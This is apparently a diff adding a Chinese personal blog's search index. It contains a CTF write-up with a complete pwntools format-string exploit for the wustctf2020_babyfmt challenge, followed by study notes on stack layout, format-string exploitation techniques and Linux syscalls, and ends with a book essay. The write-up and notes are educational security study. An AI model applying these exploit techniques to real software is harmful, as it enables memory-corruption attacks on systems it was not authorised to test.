+<p>在执行程序时，通常会打开三标准文件：stdin(标准输入文件)，stdout(标准输出文件)和stderr(标准输出文件)，且后面两个都对应终端的屏幕。</p>
+<p>定义了一个指向FILE结构的指针来接受这个返回值，存放在bss段。解这道题就需要利用这点。</p>
+<p>更具体的内容可以看看<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">CTF wiki</a>。</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这道题有三个功能，leak,fmt_attack,get_flag。</p>
+<p>效果就如他们的名字一样，特殊的地方在于，leak和fmt_attack受一个栈上参数限制导致只能执行一次。但由于是在栈上，所以可以通过格式化字符串去改写，于是就能重复使用了。</p>
+<p>栈上地址我们可以利用程序开头询问时间的漏洞，输入三个与’%ld’不对应的字符，则不会写入内存，而爆出栈上内容，从而泄露。</p>
+<p>get_flag中有一个判断条件，是输入一串字符串与bss段上的secret进行比对。我们可以爆出这个值，但是由于leak只能泄露一位，我们需要重复利用leak，要想重复利用那么就要使用很多次fmt_attack才能将secret全部爆出。因此我们选择使用fmt_attack将secret改为’\0’。除此之外，再get flag之前会关闭stdout。</p>
+<p>根据开篇提的知识点，解这道题需要将保存着<code>_IO_2_1_stdout_</code>指针的地址内容改写为<code>_IO_2_1_stderr_</code>。由于这两个指针的内容仅最后两个字节不同，因此我们只需要leak出<code>_IO_2_1_stderr_</code>的倒数第二位即可。</p>
+<p>最后调用get_flag就能拿到flag了。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node4.buuoj.cn&#x27;,28477)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_file=elf.libc</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;tell me the time:&quot;</span>,<span class="string">&#x27;a\na\na&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;ok! time is &quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0xbd5</span></span><br><span class="line">leak_addr=stack_addr+<span class="number">28</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">secret_addr=elf_base+<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(secret_addr)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">stderr=elf_base+<span class="number">0x202040</span></span><br><span class="line">stdout=elf_base+<span class="number">0x202020</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stderr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stdout)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">payload=p64(stderr+<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak=u8(io.recv(<span class="number">1</span>))</span><br><span class="line">val=(leak&lt;&lt;<span class="number">8</span>)+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(val)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(val).ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stdout)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;If you can open the door!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>入栈顺序</title>
+    <url>/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/</url>
+    <content><![CDATA[<p>对于参数和局部变量入栈顺序我选择做一个小实验来说明。</p>
+<span id="more"></span>
+
+<p>使用c编写一个程序</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, i, ++i, i++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	test();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>画出调用printf之前的局部栈：</p>
+<p><img src="https://s2.loli.net/2022/03/04/kUDVNFTisnBCOLu.png" alt="局部变量在栈中到位置"></p>
+<p>从上可以看出从上往下依次是<code>b</code>,<code>a</code>,<code>i</code>，因此栈帧中的局部变量是倒着压入栈的。</p>
+<p>然后运行程序，输出结果为’2 2 0’。</p>
+<p>这说明函数的参数的入栈顺序是倒着的：</p>
+<ol>
+<li>先执行<code>i++</code>，将返回的<code>0</code>压入栈，此时<code>i=1</code></li>
+<li>再执行<code>++i</code>，将返回的<code>2</code>压入栈，此时<code>i=2</code></li>
+<li>最后压入<code>i</code></li>
+</ol>
+<p>根据调试结果，画出<code>call printf</code>前的局部栈：</p>
+<p><img src="https://s2.loli.net/2022/03/04/ai4sQmRKu23yjlw.png" alt="参数在栈中的位置"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>栈介绍</title>
+    <url>/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<p>对于此数据结构，我们不过多讲述，仅以执行程序时内存中的栈来简单讲讲。</p>
+<span id="more"></span>
+
+<p>对于此数据结构，我们不过多讲述，仅以执行程序时内存中的栈来简单讲讲。</p>
+<!-- more -->
+
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>栈是一种只允许在一端插入或删除的线性表，且允许插入和删除的一端称为栈顶，另一端称为栈底。</p>
+<p>在执行程序时，系统会为这个程序分配一块虚拟地址空间，这块空间中的一部分为该程序对应的栈。用来保存函数调用的局部变量和其他信息，以此来<strong>控制程序流程</strong>。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。具体见下图</p>
+<p><img src="https://s2.loli.net/2022/03/05/HAdJVeYC9BiNcT2.png" alt="32位模式下内存经典布局"></p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
+<li>后进先出(LIFO)：由于栈只允许在一端插入或删除，因此具有此特性，并称为LIFO(Last In First Out)。</li>
+</ul>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><p>即入栈，插入新的元素作为栈顶。</p>
+<h3 id="Pop"><a href="#Pop" class="headerlink" title="Pop"></a>Pop</h3><p>即出栈，取出栈顶元素。</p>
+<p>在程序运行中也是以这压栈与出栈为基本操作。</p>
+<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>前面提到在程序运行中，栈会有属于自己的一块空间。并且有专门为栈服务的寄存器和其他储存数据的寄存器，这些寄存器会在其他文章中简单介绍。</p>
+<p>函数调用实际上是一个嵌套的过程。将一个函数调用时所使用到的栈空间片段称为<strong>栈帧</strong>(Stack Frame)。</p>
+<p>执行函数调用时栈的变化，实际上可以看作是以下操作对栈的影响：</p>
+<ol>
+<li>先将此函数所使用到的参数依次入栈，入栈顺序参考这篇<a href="http://110.42.161.158/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/">文章</a>。</li>
+<li>执行<code>call</code>指令，进行两步操作：<ol>
+<li>将当前<code>ip</code>或<code>cs和ip</code>压入栈中，即<code>push ip</code></li>
+<li>转移，与<code>jmp</code>原理相同</li>
+</ol>
+</li>
+<li>执行函数，并且由于一般函数的开头操作都差不多，我们也可以将其看作是函数调用的流程：<ol>
+<li>将<code>bp</code>压入栈，即<code>push bp</code></li>
+<li>抬搞栈顶，即<code>sub sp,idata</code>，分配了足够大的栈帧空间</li>
+</ol>
+</li>
+<li>函数终止，同于函数开始，结束的操作也都差不多，将其看作函数调用结束的流程：<ol>
+<li>执行<code>leave</code>指令，进行两步操作：<ol>
+<li>恢复栈顶，即<code>mov sp,bp</code></li>
+<li>恢复栈帧，即<code>pop bp</code></li>
+</ol>
+</li>
+<li>执行<code>ret</code>指令：<ul>
+<li>修改<code>ip</code>内容为栈顶中的内容，即<code>pop ip</code></li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串漏洞小结</title>
+    <url>/2022/03/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<p>记录自己对格式化字符串漏洞的理解。</p>
+<span id="more"></span>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>格式化字符串漏洞是利用程序员对格式化字符串函数的错误使用导致的对栈上的内容造成了泄露或内存中地址内容的改写。</p>
+<p>在利用格式化字符串漏洞前，我们需要对格式化字符串函数有个大概了解，<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_2">CTF Wiki</a>上写的很详细。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>格式化字符串漏洞的利用需要有程序执行格式化字符串函数的环节。</p>
+<h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><h4 id="泄露栈上内容"><a href="#泄露栈上内容" class="headerlink" title="泄露栈上内容"></a>泄露栈上内容</h4><p>通过<code>%&#123;&#125;$p</code>来泄露栈上地址。</p>
+<h4 id="改写地址内容"><a href="#改写地址内容" class="headerlink" title="改写地址内容"></a>改写地址内容</h4><p>通过<code>%&#123;&#125;$n</code>和向栈上写入任意地址来实现改写任意地址内容。并且’n’为覆盖4字节内容，’hn’为覆盖2字节内容，’hhn’为覆盖1字节内容。</p>
+<p>需要注意的是，不同模式下的传参方式不同导致构造的payload中的格式化字符串的参数不同。32位模式下，参数都是在栈上保存的，没什么好说的；64位模式下，前6位参数保存在寄存器内，因此泄露或改写的地址一般从第7位开始计算。</p>
+<p>使用<code>pwndbg</code>的<code>fmtarg</code>指令获得泄露该地址的格式化字符串，或手动计算偏移得到格式化字符串。</p>
+<p>利用这两个基本操作外，我们根据栈溢出漏洞攻击的思路进行攻击，也有格式化字符串漏洞攻击的技巧。</p>
+<h3 id="利用漏洞技巧"><a href="#利用漏洞技巧" class="headerlink" title="利用漏洞技巧"></a>利用漏洞技巧</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>能利用格式化字符串漏洞泄露栈上内容，因此可以得到出现在栈上的libc函数的地址再计算offset泄露libc的基地址；当开启了随机化保护时，也可以找到栈上main函数的<code>push rbp</code>，即main函数的首地址来计算开栈的基地址以绕过。</p>
+<h4 id="对地址块中间的内容进行修改"><a href="#对地址块中间的内容进行修改" class="headerlink" title="对地址块中间的内容进行修改"></a>对地址块中间的内容进行修改</h4><p>由于缓冲区大小的限制，导致我们不能覆盖内容为一个很大的数。因此，我们经常使用<code>hn</code>或<code>hhn</code>来进行改写内容，但由于64位模式下，一个地址块的大小为8字节，所以我们直接以该地址为任意写的地址，我们只能改到最多低2字节。但是我们如果给该地址加上一点偏移作为任意写的地址，就能对地址块中间的内容进行修改。举一个直观的例子：</p>
+<p>假设栈上地址<code>0x00</code>的内存块的内容为<code>0xAABBCCDDEEFFGGHH</code></p>
+<p>如果我们欲修改<code>0x00</code>地址的中间的<code>0xEE</code>内容的这一个字节。直接以<code>0x00</code>为地址，修改的就是最后的<code>0xHH</code>。所以我们要使用<code>0x03</code>为任意写地址，那么就能修改到中间的<code>0xEE</code>了。</p>
+<p>需要注意的是，由于Linux是小端序的系统，所以<code>0x00</code>地址块的内容实际为<code>0xHHGGFFEEDDCCBBAA</code>因此，我们要修改的中间的<code>0xEE</code>的偏移是3，而不是4。</p>
+<h4 id="栈上的partial-overwrite"><a href="#栈上的partial-overwrite" class="headerlink" title="栈上的partial overwrite"></a>栈上的partial overwrite</h4><p>栈上的partial overwrite除了利用栈溢出漏洞进行改写，也可以使用格式化字符串漏洞进行低位地址的修改，但是由于需要修改低12位地址，因此还需要泄露待改写函数的倒数第二字节的内容。</p>
+<h4 id="利用栈上的链式结构进行任意地址改写"><a href="#利用栈上的链式结构进行任意地址改写" class="headerlink" title="利用栈上的链式结构进行任意地址改写"></a>利用栈上的链式结构进行任意地址改写</h4><p>常用于非栈上的格式化字符串漏洞，即我们写入的格式化字符串并不是在栈上，所以我们不能通过写入任意地址进行改写。</p>
+<p>常利用<code>rbp</code>的链式结构(栈帧中的内容总是上一个栈帧或0)对任意地址进行改写。以当前栈帧(rbp中的地址)中存储的上一个栈帧的地址作为任意写的地址并对其中内容进行改写为我们需要修改的内容，再对上一个栈帧中的存储的地址作为任意写的地址并对其中内容进行改写。画一个更直观的图：</p>
+<p><img src="https://s2.loli.net/2022/03/04/kXphy9uBxaMcjPg.png" alt="6"></p>
+<p><em>暂时就这些，其他的等我想起了或者遇到新的技巧再补充。</em></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>系统调用介绍</title>
+    <url>/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<p>稍微介绍了一下Linux不同模式的系统调用。</p>
+<span id="more"></span>
+
+<h2 id="Linux下的系统调用"><a href="#Linux下的系统调用" class="headerlink" title="Linux下的系统调用"></a>Linux下的系统调用</h2><p>系统调用和普通库函数调用非常相似，只是系统调用由操作系统内核提供，运行于内核态，而普通的库函数调用由函数库或用户自己提供，运行于用户态。</p>
+<p>系统不同模式下的系统调用的方式不同:</p>
+<p>32位模式下，系统调用通过<code>int 0x80</code>执行中断类型码为128(0x80)的中断处理程序。<code>int</code>指令是汇编中的中断操作，而128对应的中断处理程序为：中断将指定程序传送给正在处理该中断的人，通过检查寄存器<code>eax</code>中的值，通知内核程序想要进行的系统调用，这个值称之为系统调用号。</p>
+<p>64位模式下，系统调用通过<code>syscall</code>执行。<code>syscall</code>是由内核提供的用户空间与内核空间进行交互的一套标准API，这些API能够让用户受限的访问硬件设备。其运作原理与<code>int 0x80</code>类似，也是通过检测<code>rax</code>中的值来执行指定系统调用。</p>
+<p>由于本人水平有限，不宜在此处多讲，免得误人子弟。但如果仅是为了做CTF中的题目，那么我们只需要知道不同模式下系统调用的方式即可。</p>
+<h3 id="32"><a href="#32" class="headerlink" title="32"></a>32</h3><p>传参方式：系统调用的参数存储在<code>ebx</code>,<code>ecx</code>,<code>edx</code>中，返回值存在eax寄存器</p>
+<p>系统调用号：将系统调用号存入eax</p>
+<p>调用方式：使用<code>int 0x80</code>中断调用使系统进入内核态，执行系统调用</p>
+<p>具体包括系统调用号可以看这篇<a href="https://blog.csdn.net/xiaominthere/article/details/17287965">文章</a>。</p>
+<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><p>传参方式：参数依次存入<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中，返回值存在rax寄存器</p>
+<p>系统调用号：系统调用号传入<code>rax</code></p>
+<p>调用方式：使用<code>syscall</code>进行系统调用</p>
+<p>若将系统调用号看作参数，实际上可以将64位的系统调用看作<code>syscall([rax],[rdi],[rsi],[rdx])</code></p>
+<p>系统调用号可以看这篇<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">文章</a>。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>读完《挪威的森林》的一点感受</title>
+    <url>/2022/01/13/%E8%AF%BB%E5%AE%8C%E3%80%8A%E6%8C%AA%E5%A8%81%E7%9A%84%E6%A3%AE%E6%9E%97%E3%80%8B%E7%9A%84%E4%B8%80%E7%82%B9%E6%84%9F%E5%8F%97/</url>
+    <content><![CDATA[<p>前几日把《挪威的森林》读完了，大概花了三天傍晚的时间。</p>
+<span id="more"></span>
+
+<p>整本书都给我一种忧郁的感觉，作者的笔下的每个人都具有一种忧郁却不阴郁的气质，尤其以主角和直子为最，并且无论是主人公一行人还是后面遇到的渔夫等配角，作者对于每个人都描述的有血有肉，给我留下了极深刻的映像。</p>
+<p>对于主角与其身边人的爱情故事我不大感兴趣，我对三位主要的男性角色更感兴趣。毕竟相比于把这本书看作是青春爱情小说，我更愿意把这本书看作是青春期的少年少女的迷失和救赎。木月、渡边彻、永泽，这三个人分别对应着三种人，木月像一个理想主义者，永泽像一个实用主义者，而渡边彻则是一个还在两者之间迷茫的人，最后却将两者结合的不错，看开了。或者说，这三个人仿佛就像成长中的三个阶段。</p>
+<p>木月只沉浸在自己的世界，除了主角和直子外，没有其他的交往对象了，最后在无法忍受最后一定会与外界这个必然结局中自杀了，十分极端。</p>
+<p>永泽作为实用主义者，是一个勇敢面对生活并享受人生、游戏人生的角色。我认为他的过去也一定像其他两人一样，是一个幻想破灭的理想主义者，尽管书中没有提及。很傲气也很自负，他也许很世俗，但却极端看不起那些对社会和自己人生不加思考、不焦虑的真正世俗的人。</p>
+<p>而这样两个结局大不同的角色都将主角看作朋友：木月与渡边彻共同度过那种迷茫的时期，最后仍然选择逃避生活，也是渡边彻真正认为是挚友的人；而永泽也有过焦虑，并且可能没有人可以分担这种压抑，从一次关于书的交流中，永泽看出了主角身上的那种自身经历过的焦虑，所以产生了接近的想法。可是因为渡边的一些有意的疏远，永泽就并没有过多的接近，这也是两人没有成为挚友的原因。</p>
+<p>其实我的看法是受到了别人对《斯通纳》这本书的解读的一些影响，但是当时看过后除了一点感受外就忘了，而《挪威的森林》却是让我勾起那时的一点回忆。</p>
+<p>另外我认为披头士的一首”In My Life”就像是这个故事的翻版一样。</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="430" height="86" src="//music.163.com/outchain/player?type=2&id=4337309&auto=0&height=66"></iframe>
+
+]]></content>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>categories</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>tags</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+</search>
